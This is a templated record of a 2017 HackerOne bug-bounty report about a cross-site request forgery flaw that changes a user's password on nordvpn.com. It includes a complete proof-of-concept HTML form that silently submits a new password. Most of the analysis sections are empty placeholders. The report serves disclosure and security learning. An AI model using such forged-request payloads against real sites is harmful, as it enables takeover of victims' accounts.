# CSRF to change password

## Metadata
- **Source:** HackerOne
- **Report:** 204703 | https://hackerone.com/reports/204703
- **Submitted:** 2017-02-08
- **Reporter:** paramdham
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** critical
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Description 

Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site for which the user is currently authenticated.


I have found CSRF to change password , 

POC 


<html>

  <body>
    <form action="https://nordvpn.com/profile/" method="POST">

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Description 

Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site for which the user is currently authenticated.


I have found CSRF to change password , 

POC 


<html>

  <body>
    <form action="https://nordvpn.com/profile/" method="POST">
      <input type="hidden" name="tmpl" value="settings" />
      <input type="hidden" name="password" value="password" />
      <input type="hidden" name="password&#95;confirmation" value="password" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Thanks

</details>

---
*Analysed by Claude on 2026-05-24*
